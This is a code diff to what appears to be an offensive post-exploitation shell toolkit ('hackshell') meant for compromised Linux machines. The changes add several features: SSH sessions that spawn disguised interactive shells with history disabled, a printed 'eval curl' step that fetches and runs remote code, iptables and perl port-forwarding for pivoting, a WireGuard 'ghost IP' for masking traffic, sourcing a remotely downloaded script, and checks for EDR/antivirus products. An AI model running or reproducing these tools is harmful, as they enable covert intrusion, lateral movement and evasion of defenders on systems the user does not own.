@@ -204,7 +204,7 @@ ssh-known-hosts2hashcat() {
 xssh() {
     local ttyp="$(stty -g)"
     local opts=()
-    [ -z "$NOMX" ] && {
+    [ -z "$NOMX" ] && [ -n "$XHOME" ] && {
         [ ! -d "$XHOME" ] && hs_mkxhome
         [ -d "$XHOME" ] && {
             HS_INFO "Multiplexing all SSH connections over a single TCP. ${CF}[set NOMX=1 to disable]"
@@ -213,11 +213,11 @@ xssh() {
     }
     # If we use key then disable Password auth ('-oPasswordAuthentication=no' is not portable)
     { [[ "$*" == *" -i"* ]] || [[ "$*" == "-i"* ]]; } && opts+=("-oBatchMode=yes")
-    echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
+    [ -n "$HS_URL" ] && echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
-        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
+        'unset SSH_CLIENT SSH_CONNECTION; command -v script >/dev/null && c=("script" "-qc" "exec -a [uid] /bin/bash -i" "/dev/null"); [ -z "$c" ] && command -v python >/dev/null && c=("python" "-c" "import pty; pty.spawn(\"/bin/bash\")"); [ -z "$c" ] && perl -e "use Expect" 2>/dev/null && { c=("perl" "-e" "use Expect; my \$exp = Expect->new; \$exp->raw_pty(1); \$exp->spawn(\"/bin/bash\"); \$exp->interact;");echo "May need: stty sane";}; [ -z "$c" ] && c=("bash" "-i"); LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color BASH_HISTORY=/dev/null HISTFILE=/dev/null exec -a "[ntp]" "${c[@]}"'
     [ -n "$ttyp" ] && stty "${ttyp}"
 }
 
@@ -440,50 +440,83 @@ command -v srm >/dev/null || srm() { shred "$@"; }
 command -v strings >/dev/null || { command -v perl >/dev/null && strings() { LC_ALL=C perl -nle 'print $& while m/[[:print:]]{8,}/g' "$@"; }; }
 command -v strings >/dev/null || { command -v grep >/dev/null && strings() { grep -a -o -E '[[:print:]]{8,}' "$@"; }; }
 
-bounceinit() {
-    [[ -n "$_is_bounceinit" ]] && return
-    _is_bounceinit=1
+_hs_ipt_once() {
+    local table="${1:?}"
+    local cmd="${2:?}"
+    shift 1
+    shift 1
+    iptables -t "${table}" -C "$@" >/dev/null 2>/dev/null && return
+    iptables -t "${table}" "${cmd}" "$@"
+}
+_hs_bounceinit_add() {
+    local src="${1:?}"
+    _hs_ipt_once mangle -A PREROUTING -s "${src}" -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
+}
+
+_hs_bounceinit() {
+    [ -n "$_is_hs_bounceinit" ] && return
+    _is_hs_bounceinit=1
+
+    # Return if already set (by another hackshell)
+    iptables -t nat -L POSTROUTING -vn | grep -q "mark match 0x4a4" && return
 
     echo 1 >/proc/sys/net/ipv4/ip_forward
     echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
-    [ $# -le 0 ] && {
-        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
-        set -- "0.0.0.0/0"
-    }
-    while [ $# -gt 0 ]; do
-        _hs_bounce_src+=("${1}")
-        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
-        iptables -t mangle -I PREROUTING -s "${1}" -p udp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
-        shift 1
-    done
     iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
     iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
     iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+}
+
+bounceinit() {
+    _hs_bounceinit
+
+    [ $# -le 0 ] && {
+        [ -n "$_is_hs_bounceinit" ] && return # already initialized by another hackshell or by us
+        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
+        set -- "0.0.0.0/0"
+    }
+
+    while [ $# -gt 0 ]; do
+        _hs_bounce_src+=("${1}")
+        _hs_bounceinit_add "${1}"
+        shift 1
+    done
+    iptables -t mangle -L PREROUTING -vn --line-numbers | grep -F "0x4a4"
     HS_INFO "Use ${CDC}unbounce${CDM} to remove all bounces."
 }
 
 unbounce() {
-    unset _is_bounceinit
+    unset _is_hs_bounceinit
     local str
 
-    for x in "${_hs_bounce_dst[@]}"; do
-        iptables -t nat -D PREROUTING -p tcp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}" 2>/dev/null
-        iptables -t nat -D PREROUTING -p udp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}" 2>/dev/null
+    iptables -t mangle -L PREROUTING -vn --line-numbers | grep -F "0x4a4" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t mangle -D PREROUTING "${n}"
     done
-    unset _hs_bounce_dst
 
-    for x in "${_hs_bounce_src[@]}"; do
-        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
-        iptables -t mangle -D PREROUTING -s "${x}" -p udp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
+    iptables -t nat -L PREROUTING -vn --line-numbers | grep -F "mark match 0x4a4" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t nat -D PREROUTING "${n}"
     done
-    unset _hs_bounce_src
+
     iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
     iptables -D FORWARD -m mark --mark 1188 -j ACCEPT 2>/dev/null
     iptables -t nat -D POSTROUTING -m mark --mark 1188 -j MASQUERADE 2>/dev/null
     iptables -t nat -D POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark 2>/dev/null
     HS_INFO "DONE. Check with ${CDC}iptables -t mangle -L PREROUTING -vn; iptables -t nat -L -vn; iptables -L FORWARD -vn${CN}"
+}
+
+_hs_bounces_show() {
+    local str
+    IFS=$'\n' str=$(iptables -t nat -L PREROUTING -vn | grep -F "mark match 0x4a4")
+    [ -z "$str" ] && return
+    echo -e "\n${CDG}Current bounces:${CN}"
+    echo "$str" | while read -r l; do
+        local proto="$(echo "$l" | awk '{print $4}')"
+        local dport="$(echo "$l" | grep -oE 'dpt:[0-9]+' | cut -d: -f2)"
+        local to="$(echo "$l" | grep -oE 'to:[^ ]+' | cut -d: -f2-)"
+        echo -e "  ${CDC}${proto}:${dport} ${CDM} -> ${CDY}${to}${CN}"
+    done
 }
 
 bounce() {
@@ -493,13 +526,26 @@ bounce() {
     local proto="${4:-tcp}"
     [[ $# -lt 3 ]] && {
         xhelp_bounce
+        _hs_bounces_show
         return 255
     }
     bounceinit
 
     iptables -t nat -A PREROUTING -p "${proto}" --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
-    _hs_bounce_dst+=("${fport}-${dstip}:${dstport}")
     HS_INFO "Traffic to _this_ host's ${CDY}${proto}:${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
+    _hs_bounces_show
+}
+
+
+# A simple perl port forwarder that does not require root and can be used in userland.
+bounceperl(){
+    _hs_dep perl || return
+    [ $# -lt 3 ] && {
+        echo >&2 "bounceperl <local-port> <destination-ip> <destination-port>"
+        return 255
+    }
+    _X='use IO::Socket::INET;use IO::Select;($l,$h,$p)=@ENV{qw/SPORT DIP DPORT/};$p&&$h&&$l or die"set SPORT DIP DPORT\n";$ls=IO::Socket::INET->new(LocalPort=>$l,Listen=>5,Reuse=>1,Proto=>"tcp")||die$!;while($c=$ls->accept){$r=IO::Socket::INET->new(PeerHost=>$h,PeerPort=>$p,Proto=>"tcp")||do{close$c;next};$c->autoflush(1);$r->autoflush(1);$s=IO::Select->new($c,$r);while($s->count){for $x($s->can_read){$n=sysread($x,$b,8192);if(!$n){$s->remove($x);close$x;next}$t=$x==$c?$r:$c;syswrite($t,$b)}}}' \
+    SPORT="$1" DIP="$2" DPORT="$3" LANG=C perl -e 'eval $ENV{_X}'
 }
 
 sub() {
@@ -519,6 +565,45 @@ ptr() {
 }
 
 rdns() { ptr "$@"; }
+
+# Make Wireguard use a ghost-ip.
+ghostdev() {
+    local in="${1}"
+    local ghostip="${2}"
+    local out="${3}"
+    [ -z "$out" ] && { echo >&2 "Usage: ghost <in-interface> <ghost-ip> <out-interface>"; return 255; }
+    # Mark all packets arriving from the wg interface (so that we can later SNAT them to a ghost IP).
+    iptables -t mangle -D PREROUTING -i "${in:?}" -j MARK --set-mark 0x8011 2>/dev/null
+    iptables -t mangle -A PREROUTING -i "${in:?}" -j MARK --set-mark 0x8011
+
+    iptables -t nat -D POSTROUTING -o "${out:?}" -m mark --mark 0x8011 -j SNAT --to "${ghostip:?}" 2>/dev/null
+    iptables -t nat -I POSTROUTING -o "${out:?}" -m mark --mark 0x8011 -j SNAT --to "${ghostip:?}"
+    # Make ghost-ip unreachable (using a nat/255.255.255.255 trick)
+    iptables -t nat -D PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255 2>/dev/null
+    iptables -t nat -I PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255
+
+    # Add the ghost IP to the out interface (so that ARP resolution works).
+    ip addr add "${ghostip}/32" dev "${out}" label "perm $out"
+    iptables -t mangle -L PREROUTING -vn | grep -F "0x8011"
+}
+
+unghostdev() {
+    iptables -t mangle -L PREROUTING -vn --line-numbers | grep -F "0x8011" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t mangle -D PREROUTING "${n}"
+    done
+    iptables -t nat -L POSTROUTING -vn --line-numbers | grep -F "0x8011" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t nat -D POSTROUTING "${n}"
+    done
+    iptables -t nat -L PREROUTING -vn --line-numbers | grep -F "255.255.255.255" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t nat -D PREROUTING "${n}"
+    done
+    iptables -t nat -D PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255 2>/dev/null
+    ip addr show | grep 'inet ' | grep perm | while read -r l; do
+        local ip="$(echo "$l" | awk '{print $2}')"
+        local dev="${l##*perm }"
+        ip addr del "${ip:?}" dev "${dev:?}"
+    done
+}
 
 ghostip() {
     source <(dl https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
@@ -911,8 +996,8 @@ _bin_single() {
         # Only create busybox-bins for bins that do not yet exist.
         busybox --list | while read -r fn; do
             command -v "$fn" >/dev/null && continue
-            [ -e "${XHOME}/${fn}" ] && continue
-            ln -s "busybox" "${XHOME}/${fn}"
+            [ -e "${XHOME}/bin/${fn}" ] && continue
+            ln -s "busybox" "${XHOME}/bin/${fn}"
         done
     }
     [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
@@ -1186,6 +1271,7 @@ _warn_edr() {
     _hs_chk_fn "/opt/COMODO"                                "Comodo AV"
     _hs_chk_fn "/opt/CrowdStrike"                           "CrowdShite"
     _hs_chk_fn "/opt/cyberark"                              "CyberArk"
+    _hs_chk_fn "/var/run/drweb-configd.pid"                 "Dr.Web"
     _hs_chk_fn "/opt/360sdforcnos"                          "EDR ?"
     _hs_chk_fn "/etc/filebeat"                              "Filebeat (not AV/EDR, but used to ship logs)"
     _hs_chk_fn "/opt/fireeye"                               "FireEye/Trellix EDR"
@@ -1249,7 +1335,7 @@ _warn_edr() {
     _hs_chk_systemd "itsm"                              "Comodo Client Security"
     _hs_chk_systemd "cloudmonitor"                      "Argus Cloud Agent"
     _hs_chk_systemd "falcon-sensor"                     "CrowdStrike"
-    _hs_chk_systemd "epmd"                              "CyberArk"
+    # _hs_chk_systemd "epmd"                              "CyberArk" # epmd is Erlang Port Mapper Daemon. It is used by many products, including RabbitMQ. Not specific enough to be a good indicator.
     _hs_chk_systemd "cybereason-sensor"                 "Cybereason"
     _hs_chk_systemd "elastic-agent"                     "Elastic Security"
     _hs_chk_systemd "sraagent"                          "ESET Endpoint Security"
@@ -1432,9 +1518,9 @@ _ebsock() {
         return
     }
 
-    _HS_EBSOCK=$(grep -Eom1 '@(event-[a-zA-Z0-9]{10}|/dev/(event|stats)-[a-zA-Z0-9]{10}|UDEV-[a-zA-Z0-9]{8}|/run/systemd/log|/proc/udevd)' /proc/net/unix)
+    _HS_EBSOCK=$(grep -Eom1 '@(event-[a-zA-Z0-9]{10}|/dev/(event|stats)-[a-zA-Z0-9]{10}|UDEV-[a-zA-Z0-9]{8}|/run/systemd/log|/proc/udevd)' /proc/net/unix 2>/dev/null)
     # /tmp/dbus-[a-zA-Z0-9]{10} can occur naturally so check that it's just 1.
-    [ -z "$_HS_EBSOCK" ] && _HS_EBSOCK=$(grep -E '@/tmp/dbus-[a-zA-Z0-9]{10}' /proc/net/unix | sed 's|.*@||g'  | sort | uniq -c | grep " 1 " | awk '{print $2}' | head -n1)
+    [ -z "$_HS_EBSOCK" ] && _HS_EBSOCK=$(grep -E '@/tmp/dbus-[a-zA-Z0-9]{10}' /proc/net/unix 2>/dev/null | sed 's|.*@||g'  | sort | uniq -c | grep " 1 " | awk '{print $2}' | head -n1)
     [ -z "$_HS_EBSOCK" ] && {
         _HS_EBSOCK="NA"
         return
@@ -2125,6 +2211,9 @@ _hs_mk_pty() {
         "${HS_PY:-python}" -c "import pty; pty.spawn(['${SHELL:-sh}', '-c' , 'true'])" 2>/dev/null && exec "${HS_PY:-python}" -c "import pty; pty.spawn('${SHELL:-sh}')"
     elif command -v script >/dev/null; then
         script -qc "${SHELL:-sh} -c true" /dev/null && exec script -qc "${SHELL:-sh}" /dev/null
+    elif perl -e 'use Expect' 2>/dev/null; then
+        echo -e ">>> May need ${CDC}stty sane${CN} if the terminal is messed up after this."
+        exec perl -e 'use Expect; my $exp = Expect->new; $exp->raw_pty(1); $exp->spawn("/bin/bash"); $exp->interact;'
     fi
 
     HS_ERR "Not found: python or script"
@@ -2222,7 +2311,7 @@ ttyinject() {
 
 hs_exit() {
     cd /tmp || cd /dev/shm || cd /
-    [ "${#_hs_bounce_src[@]}" -gt 0 ] && HS_WARN "Bounce still set in iptables. Type ${CDC}unbounce${CN} to stop the forward."
+    [ -n "$_is_hs_bounceinit" ] && HS_WARN "Bounce still set. Type ${CDC}unbounce${CN} to stop the forward."
     [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
         if [ -f "${XHOME}/.keep" ]; then
             HS_WARN "Keeping ${CDY}${XHOME}${CN}"
@@ -2436,6 +2525,16 @@ xnetstat() {
     return 255
 }
 
+xid() {
+    local mac uuid id ips
+    
+    command -v ip >/dev/null && mac=$(ip l sh|grep -m1 'ff:ff'|awk '{print $2;}')
+    command -v dmidecode >/dev/null && uuid=$(dmidecode -t 1 | grep -m1 UUID | awk '{print $2;}')
+    command -v hostnamectl >/dev/null && id=$(hostnamectl  | grep -m1 Machine|awk '{print $3;}')
+    ips=$(ip -4 -o addr show up scope global | awk '{split($4,a,"/"); print a[1]}' | paste -sd' ')
+    echo -e "MAC:${CDY}${mac:-NA}${CN} UUID:${CDG}${uuid:-NA}${CN} ID:${CDM}${id:-NA}${CN} IPS:${CW}${ips:-NA}${CN}"
+}
+
 hs_init_alias_reinit() {
     which curl &>/dev/null && curl --help 2>/dev/null | grep -iqm1 proto-default && alias curl="HOME=/dev/null curl --proto-default https"
     # stop curl from creating ~/.pkt/nssdb
@@ -2501,14 +2600,26 @@ hs_init_shell() {
     # Some old bash log to default location if HISTFILE is not set. Force to /dev/null
     export HISTFILE="/dev/null"
     export BASH_HISTORY="/dev/null"
-    #history -c 2>/dev/null
-    export LANG=en_US.UTF-8
-    locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
+    #history -c 2>/dev/
+    local str lang
+    str="$(locale -a 2>/dev/null)"
+    # Prefer en_US UTF-8 locale; accept UTF-8/utf-8/UTF8/utf8 variants.
+    if lang="$(printf '%s\n' "$str" | grep -Eim1 '^en_US[._-]?utf-?8$')"; then
+        LANG="$lang"
+    elif lang="$(printf '%s\n' "$str" | grep -Eim1 '^C[._-]?utf-?8$')"; then
+        LANG="$lang"
+    elif printf '%s\n' "$str" | grep -Eq '^en_US$'; then
+        LANG=en_US
+    else
+        LANG=C
+    fi
+    export LANG
     export LESSHISTFILE=-
     export REDISCLI_HISTFILE=/dev/null
     export MYSQL_HISTFILE=/dev/null
     export PSQL_HISTORY=/dev/null
     export SQLITE_HISTORY=/dev/null
+    export MONGODB_LOG_ALL=off
 
     export T=.$'\t''~?$?'".${UID}"
     # PTY backdoor to not sniff when using sudo/su.
